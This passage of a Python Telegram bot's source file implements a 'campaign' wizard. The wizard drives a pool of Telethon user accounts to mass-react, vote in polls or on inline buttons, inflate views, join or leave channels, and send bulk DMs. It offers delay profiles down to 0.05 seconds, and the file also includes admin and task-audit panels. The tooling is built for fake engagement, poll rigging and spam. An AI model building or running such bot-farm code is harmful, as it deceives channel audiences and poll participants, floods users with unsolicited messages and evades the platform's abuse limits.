            [InlineKeyboardButton(text="🛑 Cancel Action Setup", callback_data="main_menu", style="danger")]
        ]
        await callback.message.edit_text(
            f"👑 <b>Super Owner Operational Routing Console:</b>\nSelect source pool of target Telethon sessions to apply toward this campaign:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_routing_choice)
    else:
        await state.update_data(account_routing="own")
        await display_task_types_menu(callback.message, active_count)
        await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(F.data.startswith("routing_scope:"), StateFilter(TaskWizardStates.waiting_for_routing_choice))
async def handle_routing_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    scope = callback.data.split(":")[1]
    await state.update_data(account_routing=scope)
    
    user_id = callback.from_user.id
    if scope == "all":
        active_count = await db_mgr.db.accounts.count_documents({"status": "active"})
    else:
        active_count = await db_mgr.db.accounts.count_documents({"status": "active", "user_id": user_id})

    await display_task_types_menu(callback.message, active_count)
    await state.set_state(TaskWizardStates.choosing_type)

async def display_task_types_menu(message_obj: Any, active_count: int):
    hub_text = (
        f"🌋 <b>Campaign Launch Console Terminal</b>\n\n"
        f"⚡ Accessible Active Engine Workers: <code>{active_count}</code> accounts\n"
        f"Choose target automation campaign execution below:"
    )
    if isinstance(message_obj, Message):
        await message_obj.answer(hub_text, reply_markup=get_task_types_keyboard(active_count), parse_mode="HTML")
    else:
        await message_obj.edit_text(hub_text, reply_markup=get_task_types_keyboard(active_count), parse_mode="HTML")

@router.callback_query(F.data.startswith("set_type:"), StateFilter(TaskWizardStates.choosing_type))
async def handle_type_selection(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    selected_task_type = callback.data.split(":")[1]
    await state.update_data(task_type=selected_task_type, selected_emojis=[])

    if selected_task_type == "leave":
        text = "❌ <b>Select Leave Channel Deployment Scope:</b>"
        await callback.message.edit_text(text, reply_markup=get_leave_channel_options_keyboard(), parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_leave_choice)
    elif selected_task_type in ["react", "react_vote", "react_view", "react_vote_view"]:
        await prompt_for_emojis(callback.message, [])
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    elif selected_task_type in ["vote", "vote_view"]:
        await prompt_for_vote_mode(callback.message)
        await state.set_state(TaskWizardStates.waiting_for_vote_mode_choice)
    elif selected_task_type == "dm":
        text = "💬 <b>Enter the raw Direct DM message body text to dispatch:</b>"
        await callback.message.edit_text(text, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)
    elif selected_task_type in ["view", "join", "refer", "speed"]:
        text = "🔗 <b>Provide public/private target Telegram channel link or username:</b>\n<i>(e.g., https://t.me/example, @example, or https://t.me/+AbCdEfGhIjKlMnOp)</i>"
        await callback.message.edit_text(text, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_channel_link)

@router.callback_query(F.data.startswith("leave_mode:"), StateFilter(TaskWizardStates.waiting_for_leave_choice))
async def handle_leave_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    mode = callback.data.split(":")[1]
    await state.update_data(leave_mode=mode)
    
    if mode == "all":
        await prompt_for_speed(callback.message)
        await state.set_state(TaskWizardStates.waiting_for_speed_choice)
    else:
        text = "🔗 <b>Provide link/username of channel to leave:</b>"
        await callback.message.edit_text(text, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_channel_link)

async def prompt_for_emojis(message_obj: Any, selected_emojis: List[str]):
    text = (
        f"🔥 <b>Reaction Pack Picker Configuration</b>\n\n"
        f"Selected Reactions: {' '.join(selected_emojis) if selected_emojis else '<i>None (default 👍)</i>'}\n"
        f"Click emojis below to toggle inclusion in execution array:"
    )
    if isinstance(message_obj, Message):
        await message_obj.answer(text, reply_markup=get_emoji_selection_keyboard(selected_emojis), parse_mode="HTML")
    else:
        await message_obj.edit_text(text, reply_markup=get_emoji_selection_keyboard(selected_emojis), parse_mode="HTML")

@router.callback_query(F.data.startswith("toggle_emoji:"), StateFilter(TaskWizardStates.waiting_for_emojis))
async def toggle_emoji_callback(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    emoji = callback.data.split(":")[1]
    fsm_data = await state.get_data()
    selected_emojis = fsm_data.get("selected_emojis", [])

    if emoji in selected_emojis:
        selected_emojis.remove(emoji)
    else:
        selected_emojis.append(emoji)

    await state.update_data(selected_emojis=selected_emojis)
    await prompt_for_emojis(callback.message, selected_emojis)

@router.callback_query(F.data == "finish_emoji_selection", StateFilter(TaskWizardStates.waiting_for_emojis))
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    fsm_data = await state.get_data()
    selected_task_type = fsm_data.get("task_type", "")

    if selected_task_type in ["react_vote", "react_vote_view"]:
        await prompt_for_vote_mode(callback.message)
        await state.set_state(TaskWizardStates.waiting_for_vote_mode_choice)
    else:
        text = "🔗 <b>Provide public/private target Telegram channel link or username:</b>"
        await callback.message.edit_text(text, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_channel_link)

async def prompt_for_vote_mode(message_obj: Any):
    text = "🗳️ <b>Choose Poll or Inline Voting Framework Target:</b>"
    buttons = [
        [InlineKeyboardButton(text="📊 Standard Native Telegram Poll", callback_data="vote_mode:poll", style="primary")],
        [InlineKeyboardButton(text="🔘 Inline Keyboard Callback Button", callback_data="vote_mode:inline", style="primary")]
    ]
    if isinstance(message_obj, Message):
        await message_obj.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
    else:
        await message_obj.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.callback_query(F.data.startswith("vote_mode:"), StateFilter(TaskWizardStates.waiting_for_vote_mode_choice))
async def handle_vote_mode_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    v_mode = callback.data.split(":")[1]
    await state.update_data(vote_mode=v_mode)

    if v_mode == "poll":
        text = "🔢 <b>Enter zero-based poll option index integer to vote for:</b>\n<i>(e.g., 0 for First Option, 1 for Second Option, etc.)</i>"
        await callback.message.edit_text(text, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_poll_option_index)
    else:
        text = "🔤 <b>Type exact button text label or emoji symbol on the inline button:</b>"
        await callback.message.edit_text(text, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_button_text)

@router.message(StateFilter(TaskWizardStates.waiting_for_poll_option_index))
async def process_poll_index(message: Message, state: FSMContext):
    val = message.text.strip()
    if not val.isdigit():
        await message.answer("❌ Please provide a valid numerical integer (e.g., 0, 1, 2).")
        return
    await state.update_data(poll_option_index=int(val))
    text = "🔗 <b>Provide public/private target Telegram channel link or username:</b>"
    await message.answer(text, parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_channel_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext):
    btn_text = message.text.strip()
    await state.update_data(button_text=btn_text)
    text = "🔗 <b>Provide public/private target Telegram channel link or username:</b>"
    await message.answer(text, parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_channel_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext):
    dm_body = message.text.strip()
    await state.update_data(dm_text=dm_body)
    text = "🔗 <b>Provide public target user handle or ID to send message to:</b>"
    await message.answer(text, parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_channel_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
async def process_channel_link(message: Message, state: FSMContext):
    link = message.text.strip()
    await state.update_data(channel_link=link)
    fsm_data = await state.get_data()
    selected_task_type = fsm_data.get("task_type", "")

    if selected_task_type in ["react", "vote", "view", "react_vote", "react_view", "vote_view", "react_vote_view", "speed"]:
        parsed_target, link_msg_id, _, _ = parse_telegram_link(link)
        if link_msg_id:
            await state.update_data(post_link=link)
            await prompt_for_speed(message)
            await state.set_state(TaskWizardStates.waiting_for_speed_choice)
        else:
            text = "📍 <b>Provide target Telegram message post link:</b>\n<i>(e.g. https://t.me/channel/123 or https://t.me/c/12345/678)</i>"
            await message.answer(text, parse_mode="HTML")
            await state.set_state(TaskWizardStates.waiting_for_post_link)
    else:
        await prompt_for_speed(message)
        await state.set_state(TaskWizardStates.waiting_for_speed_choice)

@router.message(StateFilter(TaskWizardStates.waiting_for_post_link))
async def process_post_link(message: Message, state: FSMContext):
    p_link = message.text.strip()
    await state.update_data(post_link=p_link)
    await prompt_for_speed(message)
    await state.set_state(TaskWizardStates.waiting_for_speed_choice)

async def prompt_for_speed(message_obj: Any):
    text = "🏎️ <b>Choose Task Execution Delay Profile:</b>"
    buttons = [
        [InlineKeyboardButton(text="⚡ Safer (2.5s Delay)", callback_data="speed_mode:safer", style="success")],
        [InlineKeyboardButton(text="🛡️ Safe Mode (5.0s Delay)", callback_data="speed_mode:safe", style="primary")],
        [InlineKeyboardButton(text="🚀 Fastest Speed (0.05s Delay)", callback_data="speed_mode:fastest", style="danger")]
    ]
    if isinstance(message_obj, Message):
        await message_obj.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
    else:
        await message_obj.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.callback_query(F.data.startswith("speed_mode:"), StateFilter(TaskWizardStates.waiting_for_speed_choice))
async def handle_speed_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    spd = callback.data.split(":")[1]
    await state.update_data(speed_mode=spd)

    user_id = callback.from_user.id
    fsm_data = await state.get_data()
    account_routing = fsm_data.get("account_routing", "own")
    role = await db_mgr.get_user_role(user_id)

    if role == "super_owner":
        if account_routing == "all":
            max_avail = await db_mgr.db.accounts.count_documents({"status": "active"})
        else:
            max_avail = await db_mgr.db.accounts.count_documents({"status": "active", "user_id": user_id})
    elif role == "owner":
        max_avail = await db_mgr.db.accounts.count_documents({"status": "active"})
    else:
        assignments = await db_mgr.db.account_assignments.find({"user_id": user_id}).to_list(length=None)
        assigned_phones = [a["phone"] for a in assignments]
        max_avail = await db_mgr.db.accounts.count_documents({
            "status": "active",
            "$or": [
                {"user_id": user_id},
                {"phone": {"$in": assigned_phones}}
            ]
        })

    text = f"🔢 <b>Type count of accounts to run on this task:</b>\n<i>(Available active operational accounts: <code>{max_avail}</code>)</i>"
    await callback.message.edit_text(text, parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_account_scale)

@router.message(StateFilter(TaskWizardStates.waiting_for_account_scale))
async def process_account_scale_and_launch(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    val = message.text.strip()

    if not val.isdigit() or int(val) <= 0:
        await message.answer("❌ Invalid integer value. Enter positive number count:")
        return

    run_account_count = int(val)
    fsm_data = await state.get_data()
    await state.clear()

    task_type = fsm_data.get("task_type", "view")
    channel_link = fsm_data.get("channel_link", "")
    post_link = fsm_data.get("post_link", channel_link)
    
    parsed_channel, _, _, _ = parse_telegram_link(channel_link)
    parsed_post_target, post_msg_id, _, link_query_vote = parse_telegram_link(post_link)

    payload = {
        "target": parsed_post_target or parsed_channel,
        "channel_target": parsed_channel or parsed_post_target,
        "msg_id": post_msg_id,
        "reactions": fsm_data.get("selected_emojis", ["👍"]),
        "vote_mode": fsm_data.get("vote_mode", "poll"),
        "poll_option_index": fsm_data.get("poll_option_index", 0),
        "button_text": fsm_data.get("button_text", link_query_vote or ""),
        "text": fsm_data.get("dm_text", "Hello!"),
        "leave_mode": fsm_data.get("leave_mode", "single"),
        "speed_mode": fsm_data.get("speed_mode", "safe"),
        "run_account_count": run_account_count,
        "account_routing": fsm_data.get("account_routing", "own")
    }

    task_id = await db_mgr.get_next_task_id()

    await db_mgr.db.tasks.insert_one({
        "task_id": task_id,
        "creator_id": user_id,
        "task_type": task_type,
        "payload": payload,
        "status": "pending",
        "progress": "0%",
        "created_at": time.time()
    })

    status_card = await message.answer(
        f"⏳ <b>Campaign Processing Deployment Framework Running...</b>\n\n"
        f"[{make_progress_bar(0)}] <b>0%</b>\n"
        f"📊 <code>0/{run_account_count}</code> accounts completely run\n"
        f"✅ Successful: <code>0</code> | ❌ Blocked: <code>0</code>\n"
        f"⏱ Time remaining duration: Calculating...",
        parse_mode="HTML"
    )

    await task_queue.add_task(
        task_id=task_id,
        creator_id=user_id,
        task_type=task_type,
        payload=payload,
        bot_instance=bot,
        status_msg_id=status_card.message_id
    )

    await db_mgr.log_action(user_id, f"Launched task #{task_id} ({task_type}) on {run_account_count} accounts", bot, operational=True)

# --- TASK AUDIT & LOGS MONITORING ---
@router.callback_query(F.data == "view_tasks")
async def view_active_tasks(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()

    role = await db_mgr.get_user_role(user_id)
    if role in ["owner", "super_owner"]:
        rows = await db_mgr.db.tasks.find({}).sort("created_at", -1).limit(10).to_list(length=10)
    else:
        rows = await db_mgr.db.tasks.find({"creator_id": user_id}).sort("created_at", -1).limit(10).to_list(length=10)

    if not rows:
        text = "📊 <b>Campaign Audit Dashboard Log Hub</b>\n\n<i>Zero campaign execution records mapped.</i>"
    else:
        text = "📊 <b>Campaign Audit Dashboard Log Hub (Recent 10 Tasks)</b>\n\n"
        for r in rows:
            st = r.get("status", "pending").upper()
            icon = "🟢" if st == "COMPLETED" else ("🟡" if st == "RUNNING" else "🔴")
            text += f"{icon} <b>Task #{r['task_id']}</b> [{r['task_type'].upper()}]\nStatus: <b>{st}</b> | Progress: <code>{r.get('progress', '0%')}</code>\n\n"

    buttons = [[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

# --- REFERRAL NETWORK HOOKS ---
@router.callback_query(F.data == "view_referrals")
async def view_referrals_menu(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()

    ref_count = await db_mgr.db.users.count_documents({"referred_by": user_id})
    ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    text = (
        f"⚜️ <b>Referral Network Telemetry Dashboard</b>\n\n"
        f"Your Personal Referral Link:\n<code>{ref_link}</code>\n\n"
        f"👥 Total Invited Active Users: <code>{ref_count}</code>"
    )
    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

# --- ADMINISTRATIVE TELEMETRY METRICS ---
@router.callback_query(F.data == "admin_panel")
async def view_admin_panel(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await callback.answer("⚠️ Clearance Level Denied.", show_alert=True)
        return

    await callback.answer()
    total_users = await db_mgr.db.users.count_documents({})
    total_accounts = await db_mgr.db.accounts.count_documents({})
    active_accounts = await db_mgr.db.accounts.count_documents({"status": "active"})
    dead_accounts = await db_mgr.db.accounts.count_documents({"status": "dead"})

    text = (
        f"🛡️ <b>Administrative Panel Command Terminal</b>\n\n"
        f"👤 Total System Users Registered: <code>{total_users}</code>\n"
        f"📱 Total Datastore Accounts: <code>{total_accounts}</code>\n"
        f"🟢 Operational Accounts: <code>{active_accounts}</code>\n"
        f"🔴 Deactivated Accounts: <code>{dead_accounts}</code>\n\n"
        f"<b>Admin Control Commands:</b>\n"
        f"• <code>/addadmin &lt;user_id&gt;</code> - Grant admin access\n"
        f"• <code>/removeadmin &lt;user_id&gt;</code> - Revoke admin access\n"
        f"• <code>/grantaccess &lt;user_id&gt; [count]</code> - Grant account ID execution access\n"
        f"• <code>/revokeaccess &lt;user_id&gt;</code> - Revoke assigned account access\n"
        f"• <code>/broadcast</code> - Dispatch global system message\n"
        f"• <code>/canceltasks</code> - Cancel running/pending campaign tasks\n"
        f"• <code>/adminstorage</code> - View MongoDB telemetry metrics"
    )

    buttons = [
        [InlineKeyboardButton(text="💾 Check DB Storage Metrics", callback_data="check_db_storage", style="primary")],
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
    ]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.callback_query(F.data == "system_stats")
async def view_system_stats(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("⚠️ Privilege Denied.", show_alert=True)
        return

    await callback.answer()
    users = await db_mgr.db.users.find({}).to_list(length=50)

    text = "📈 <b>System Users Overview</b>\n\n"
    for u in users:
        acc_cnt = await db_mgr.db.accounts.count_documents({"user_id": u['user_id']})
        text += f"• <code>{u['user_id']}</code> (@{u.get('username', 'None')}) ➜ Role: <b>{u.get('role', 'user').upper()}</b> | Accounts: <code>{acc_cnt}</code>\n"

    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

# --- INITIALIZATION ENGINE ENTRYPOINT ---
async def main():
    await db_mgr.init()
    
    bot = Bot(token=config.BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    global bot_username
    try:
        bot_user = await bot.get_me()
        bot_username = bot_user.username
        logger.info(f"Connected as @{bot_username}")
    except Exception as e:
        logger.error(f"Failed fetching Bot Identity: {e}")

    asyncio.create_task(task_queue.start_worker())

    logger.info("Bot event polling initiated.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
